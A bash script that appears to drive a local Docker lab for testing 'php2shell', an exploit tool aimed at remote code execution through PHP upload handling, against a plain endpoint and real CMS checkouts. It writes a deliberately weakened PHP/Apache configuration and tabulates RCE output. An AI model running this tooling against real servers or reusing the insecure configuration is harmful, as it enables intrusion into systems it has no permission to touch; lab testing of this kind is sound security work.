#!/usr/bin/env bash
# php2shell coverage lab.
#
# The trigger runs pre-RINIT (rfc1867), so it is app-independent IN PRINCIPLE.
# The leak, however, is a two-request race against one worker and only survives
# if the request ends cleanly (no fatal, no installer redirect). Unconfigured
# real CMS (WordPress "Requirements Not Met", Joomla 302, MediaWiki 500, Drupal
# bootstrap throw) therefore do NOT fire out of the box - this is the honest
# result. A fully-installed, healthy CMS (returns 200) is reachable the same as
# the plain endpoint below.
#
# usage:
#   ./coverage.sh up|run|down          # plain mod_php endpoint (concrete proof)
#   ./coverage.sh real                 # fire against real fetched CMS checkouts
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
INI=$HERE/lab-php.ini
CONF=$HERE/lab-apache.conf
WWW=$HERE/coverage/www
OUT=$HERE/out
PORT=${PORT:-8099}
APPS="plain"
REAL_APPS="wordpress joomla mediawiki phpbb drupal"

mkdir -p "$OUT"; chmod 777 "$OUT"

cat > "$INI" <<'INI'
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
memory_limit = 8M
post_max_size = 64M
upload_max_filesize = 64M
session.save_path = "/tmp"
session.use_strict_mode = 0
session.use_cookies = 1
session.upload_progress.enabled = On
session.upload_progress.cleanup = On
INI

cat > "$CONF" <<'CONF'
KeepAlive Off
<IfModule mpm_prefork_module>
    StartServers 1
    MinSpareServers 1
    MaxSpareServers 1
    MaxRequestWorkers 1
    ServerLimit 1
    MaxConnectionsPerChild 0
</IfModule>
CONF

table() {
  printf "%-10s | %-30s | %s\n" "APP" "DETECTED" "RCE OUTPUT"
  printf '%s\n' "---------------------------------------------------------------------"
  for a in $1; do
    out=$(python3 "$HERE/php2shell.py" rce "http://127.0.0.1:$PORT/$a/index.php" --attempts 2 2>/dev/null)
    detected=$(echo "$out" | grep -oE "DETECTED  [A-Za-z]+ at" | sed 's/DETECTED  //; s/ at//')
    rce=$(echo "$out" | grep -oE "OUTPUT  .*" | sed 's/OUTPUT  //' | head -1)
    [ -z "$rce" ] && rce="(no output)"
    printf "%-10s | %-30s | %s\n" "$a" "$detected" "$rce"
  done
}

case "${1:-}" in
  up)
    docker rm -f php2shell-cov >/dev/null 2>&1
    docker run -d --name php2shell-cov -p 127.0.0.1:$PORT:80 \
      -v "$INI":/usr/local/etc/php/conf.d/zz.ini:ro \
      -v "$CONF":/etc/apache2/conf-enabled/zz.conf:ro \
      -v "$WWW":/var/www/html:ro \
      -v "$OUT":/out \
      php:8.4.26-apache sh -c 'chown -R www-data:www-data /out; exec apache2-foreground' >/dev/null
    sleep 5
    curl -s -o /dev/null -w "target http=%{http_code}\n" http://127.0.0.1:$PORT/plain/index.php
    ;;
  run)
    table "$APPS"
    ;;
  real)
    table "$REAL_APPS"
    ;;
  down)
    docker rm -f php2shell-cov >/dev/null 2>&1 && echo "coverage lab removed"
    ;;
  *)
    sed -n '1,16p' "$0"
    ;;
esac
